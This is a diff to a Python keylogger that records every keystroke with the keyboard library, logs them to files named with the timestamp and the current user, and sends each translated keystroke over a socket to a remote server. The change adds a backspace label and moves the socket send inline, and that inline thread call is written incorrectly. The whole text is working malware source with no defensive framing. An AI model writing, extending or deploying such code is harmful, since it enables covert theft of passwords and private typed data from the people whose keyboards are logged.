@@ -17,7 +17,7 @@ def checkLogsPath(path):
 def recording():
     return keyboard.read_event(suppress=True)
 
-def writeToFileRaw(lPath, lName, l):
+def writeToFileRaw(lPath, lName, l):    
     newLog = open(lPath + lName, "a")
     newLog.write(str(l))
     newLog.close()
@@ -36,23 +36,20 @@ def writeToFileHuman(lPath, lName, strh):
             strh = " [ESC] "
         elif strh.find("stamp") != -1:
             strh = " [STAMP] "
+        elif strh.find("backspace") != -1:
+            strh = " [BACKSPACE] "
         elif strh.find("bloc maius") != -1:
             strh = " [MAIUSCOLO] "
+
         else:
             strh = strh.removeprefix("KeyboardEvent(")
             strh = strh.removesuffix(" down)\n")
-    else:
-        return 0
-    
-    thread_write_server = threading.Thread(target=writeToServer, args=strh)
-    thread_write_server.start()
+        thread_write_server = threading.Thread(target=(client_socket.sendall(strh.encode('utf-8'))))
+        thread_write_server.start()
 
     newLog = open(lPath + lName, "a")
     newLog.write(strh)
     newLog.close()
-
-def writeToServer(mes):
-    client_socket.sendall(mes.encode())
 
 def main():
     tempLogName = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + "_" + getpass.getuser()
@@ -67,6 +64,7 @@ def main():
         thread_write_raw.start()
         thread_write_human = threading.Thread(target=writeToFileHuman, args=(logsPath, tempLogName+".txt", strh + "\n"))
         thread_write_human.start()
+        
 
 #########################
 if __name__== "__main__":
